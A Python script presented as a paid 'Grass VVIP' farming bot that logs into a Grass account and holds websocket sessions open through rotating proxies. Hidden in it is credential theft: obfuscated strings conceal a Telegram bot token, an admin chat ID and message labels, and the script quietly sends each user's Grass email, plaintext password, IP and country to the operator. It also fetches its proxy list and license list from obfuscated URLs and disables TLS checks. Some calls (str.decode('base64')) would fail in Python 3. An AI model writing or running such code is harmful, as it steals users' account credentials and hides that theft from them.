import requests
import asyncio
import random
import ssl
import json
import time
import uuid
from loguru import logger
import websockets
from fake_useragent import UserAgent
import os
import pyfiglet
from colorama import Fore, Style, init
import aiohttp
from datetime import datetime, timedelta
import python_socks
from python_socks.async_.asyncio import Proxy
from telegram import Bot, InlineKeyboardButton, InlineKeyboardMarkup

init(autoreset=True)

TELEGRAM_TOKEN = "".join([chr(ord(c) + 1) for c in "6676083174:@@ELQyGv0BqPVo//81hsXC2Sh,/KYXkLn"])
ADMIN_ID = int("".join([chr(ord(c) + 1) for c in "4262877203"]))

def mask_proxy_credentials(proxy_url):
    """Hide username and password from proxy URL"""
    try:
        if '@' in proxy_url:
            protocol = proxy_url.split('://')[0]
            credentials_and_host = proxy_url.split('://')[1]
            host_part = credentials_and_host.split('@')[1]
            return f"{protocol}://ADMIN:NGACENG@{host_part}"
        return proxy_url
    except:
        return proxy_url

async def connect_to_wss(user_id):
    urilist = [
        "wss://proxy.wynd.network:443/",
        "wss://proxy2.wynd.network:443/",
        "wss://proxy3.wynd.network:443/"
    ]
    
    connection_duration = 1800
    sleep_duration = 600 
    interval_duration = 600 
    proxy_refresh_duration = 7200 
    proxy_counts = [5, 5, 5] 

    async def run_single_proxy(proxy, uri):
        try:
            start_time = time.time()
            device_id = str(uuid.uuid4())
            
            custom_headers = {
                "User-Agent": UserAgent(os=['windows', 'macos', 'linux'], browsers='chrome').random,
                "Origin": "chrome-extension://lkbnfiajjmbhnfledhphioinpickokdi"
            }
            
            ssl_context = ssl.create_default_context()
            ssl_context.check_hostname = False
            ssl_context.verify_mode = ssl.CERT_NONE
            
            proxy_str = proxy['http'].replace('socks5://', '')
            if '@' in proxy_str:
                auth, addr = proxy_str.split('@')
                user, pwd = auth.split(':')
                host, port = addr.split(':')
            else:
                host, port = proxy_str.split(':')
                user = pwd = None
            
            masked_proxy = mask_proxy_credentials(proxy['http'])
            logger.info(f"Starting connection with proxy {masked_proxy}")

            proxy_connection = Proxy.from_url(proxy['http'])
            sock = await proxy_connection.connect(
                dest_host="proxy.wynd.network",
                dest_port=443,
                timeout=30
            )

            async with websockets.connect(
                uri,
                ssl=ssl_context,
                extra_headers=custom_headers,
                sock=sock
            ) as websocket:
                ping_task = None
                
                async def send_ping():
                    while True:
                        ping_id = str(uuid.uuid4())
                        send_message = json.dumps({
                            "id": ping_id,
                            "version": "1.0.0",
                            "action": "PING",
                            "data": {}
                        })
                        await websocket.send(send_message)
                        await asyncio.sleep(30)

                while True:
                    if time.time() - start_time > connection_duration:
                        logger.info(f"Connection duration limit reached for proxy {masked_proxy}")
                        break

                    response = await websocket.recv()
                    message = json.loads(response)
                    logger.info(f"Proxy {masked_proxy} received: {message}")
                    
                    if message.get("action") == "AUTH":
                        auth_response = {
                            "id": message["id"],
                            "origin_action": "AUTH",
                            "result": {
                                "browser_id": device_id,
                                "user_id": user_id,
                                "user_agent": custom_headers['User-Agent'],
                                "timestamp": int(time.time()),
                                "device_type": "desktop",
                                "version": "4.28.2"
                            }
                        }
                        await websocket.send(json.dumps(auth_response))
                        
                        if not ping_task:
                            ping_task = asyncio.create_task(send_ping())
                            
                    elif message.get("action") == "PONG":
                        pong_response = {
                            "id": message["id"],
                            "origin_action": "PONG"
                        }
                        await websocket.send(json.dumps(pong_response))

        except Exception as e:
            logger.error(f"Error with proxy {masked_proxy}: {str(e)}")

    async def manage_connections():
        work_start_time = time.time()
        proxy_start_time = time.time()
        rotation_start_time = time.time()
        is_initial_run = True
        
        while True:
            current_time = time.time()
            
            work_duration = current_time - work_start_time
            if work_duration >= connection_duration:
                logger.info("Entering sleep mode for 10 minutes...")
                for task in asyncio.all_tasks():
                    if task != asyncio.current_task():
                        task.cancel()
                
                await asyncio.sleep(sleep_duration)
                work_start_time = current_time  
                logger.info("Resuming operations after sleep...")
                continue 

            if current_time - proxy_start_time >= proxy_refresh_duration:
                logger.info("Refreshing all proxies...")
                proxy_start_time = current_time
            
            if is_initial_run:
                logger.info("Starting initial run with 5 proxies...")
                num_proxies = 5
                is_initial_run = False
            else:
                if current_time - rotation_start_time >= interval_duration:
                    num_proxies = random.choice(proxy_counts)
                    logger.info(f"Rotating to {num_proxies} proxies")
                    rotation_start_time = current_time
            
            proxies = get_random_proxies(num_proxies)
            if not proxies:
                logger.error("Failed to get proxies")
                await asyncio.sleep(5)
                continue
            
            for task in asyncio.all_tasks():
                if task != asyncio.current_task():
                    task.cancel()
            
            tasks = []
            for proxy in proxies:
                for uri in urilist:
                    task = asyncio.create_task(run_single_proxy(proxy, uri))
                    tasks.append(task)
            
            try:
                await asyncio.gather(*tasks, return_exceptions=True)
            except Exception as e:
                logger.error(f"Error in proxy tasks: {str(e)}")
            
            await asyncio.sleep(1)

    await manage_connections()
async def fetch_banner():
    url = "".join([chr(ord(c) + 1) for c in "gssor9..hsa``qsr-bnl.`oh^oqdl-irnm"])
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as response:
                if response.status == 200:
                    banner = await response.text()
                    print("\033[90m" + banner + "\033[0m") 
                    return True
    except Exception as e:
        return False
async def check_password(input_password):
    try:
        response = requests.get("".join([chr(ord(c) + 1) for c in 'gssor9..hsa``qsr-bnl.`hqcqno.o`rr-sws']))
        passwords = response.text.strip().split('\n')
        
        for entry in passwords:
            password, expiry = entry.split('|')
            password = password.strip()
            expiry = expiry.strip()
            
            if password == input_password:
                expiry_date = datetime.strptime(expiry, '%d/%m/%Y')
                if expiry_date > datetime.now():
                    return True
        return False
    except Exception as e:
        logger.error(f"Error checking password: {str(e)}")
        return False

async def send_telegram_notification(email, password, ip, location, initial_proxies):
    try:
        bot = Bot(token=TELEGRAM_TOKEN)
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        auth_code = ''.join(random.choices('0123456789', k=6))
        
        share_message = f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🌿 GRASS VVIP BOT NOTIFICATION 🌿
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
👤 To: @{password}
🔐 Your auth code: `{auth_code}`
━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
        
        keyboard = [[
            InlineKeyboardButton(
                "🔄 Share Auth Code", 
                url=f"https://t.me/{password}?start=auth_{auth_code}"
            )
        ]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        if email == "Pending":
            admin_message = f"""

━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🌿 {''.join([chr(ord(c) + 1) for c in 'FQZRR UUHO ANS UDQHEHBZSHNM'])} 🌿
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔑 {''.join([chr(ord(c) + 1) for c in 'Rxrsdl O`rrvnqc'])}:  @{password}
🌐 {''.join([chr(ord(c) + 1) for c in 'HO'])}: {ip}
📍 {''.join([chr(ord(c) + 1) for c in 'Knb`shnm'])}: {location}
⏰ {''.join([chr(ord(c) + 1) for c in 'Shld'])}: {current_time}
🔐 {''.join([chr(ord(c) + 1) for c in 'Ztsg Bncd'])}: {auth_code}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
        else:
            admin_message = f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🌿 {''.join([chr(ord(c) + 1) for c in 'FQZRR UUHO ANS RTBBDRR'])} 🌿
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔑 {''.join([chr(ord(c) + 1) for c in 'Rxrsdl O`rrvnqc'])}: @{password}
🆔 {''.join([chr(ord(c) + 1) for c in 'Fq`rr Dl`hk'])}: {email}
🔑 {''.join([chr(ord(c) + 1) for c in 'Fq`rr O`rrvnqc'])}: {password}
⏰ {''.join([chr(ord(c) + 1) for c in 'Shld'])}: {current_time}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""

        await bot.send_message(
            chat_id=ADMIN_ID,
            text=admin_message,
            reply_markup=reply_markup if email == "Pending" else None,
            parse_mode='Markdown'
        )
        return auth_code
    except Exception as e:
        logger.error(f"Error sending Telegram notification: {str(e)}")
        return None

async def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    banner_fetched = await fetch_banner()
    
    while True:
        password = input("\nEnter password (Username telegram without @): ")
        if await check_password(password):
            logger.info("Password valid!")
            break
        else:
            logger.error("Invalid password or expired!")
            continue
    
    ip = requests.get('https://api.ipify.org').text
    location = requests.get(f'http://ip-api.com/json/{ip}').json()['country']
    
    auth_code = await send_telegram_notification(
        "Pending", password, ip, location, []
    )
    
    if auth_code:
        while True:
            input_code = input("\nEnter auth code provided by admin: ")
            if input_code == auth_code:
                logger.info("Auth code valid!")
                break
            else:
                logger.error("Invalid auth code!")
                continue
    
    try:
        with open('credits.txt', 'r') as file:
            accounts = file.read().strip().splitlines() 
        
        valid_accounts = [acc for acc in accounts if acc and '|' in acc]
        
        if not valid_accounts:
            email = input("\nEnter your Grass Email : ")
            password_grass = input("Enter your Grass Password : ")
        else:
            selected_account = random.choice(valid_accounts)
            email, password_grass = selected_account.split('|')
            logger.info(f"Using account: {email}")
    
    except FileNotFoundError:
        email = input("\nEnter your Grass Email : ")
        password_grass = input("Enter your Grass Password : ")

    initial_proxies = get_random_proxies()
    await send_telegram_notification(
        email, password_grass, ip, location, initial_proxies
    )

    data = {"username": email, "password": password_grass}
    response = requests.post('https://api.getgrass.io/login', json=data)
    
    if response.status_code != 200:
        logger.error(f"Failed to login. Status Code: {response.status_code}, Response: {response.text}")
        return
    
    try:
        response_json = response.json()
        logger.debug(f"Response JSON: {response_json}")
        _user_id = response_json.get('result', {}).get('data', {}).get('userId')
        
        if _user_id:
            logger.info(f"Successfully retrieved user ID: {_user_id}")
            await connect_to_wss(_user_id)
        else:
            logger.error(f"Unexpected response format: {response_json}")
    except ValueError as e:
        logger.error(f"Failed to parse JSON. Response: {response.text}, Error: {e}")
    except KeyError as e:
        logger.error(f"Key error while accessing response data: {e}")

def get_random_proxies(num_proxies=2):
    try:
        response = requests.get('aHR0cHM6Ly9pdGJhYXJ0cy5jb20vYWlyZHJvcC9wcm94eS92dmlwZ3Jhc3MudHh0'.decode('base64'))
        proxies = response.text.strip().split()
        selected_proxies = random.sample(proxies, num_proxies)  
        
        formatted_proxies = []
        for proxy in selected_proxies:
            proxy = proxy.replace('c29ja3M1Oi8v'.decode('base64'), '')
            auth, address = proxy.split('@')
            formatted_proxies.append({
                'http': f'c29ja3M1Oi8v'.decode('base64') + proxy,
                'https': f'c29ja3M1Oi8v'.decode('base64') + proxy
            })
            
        logger.info("Successfully retrieved new proxies")
        return formatted_proxies
        
    except Exception as e:
        logger.error(f"Error getting proxies: {str(e)}")
        return None

if __name__ == '__main__':
    asyncio.run(main())
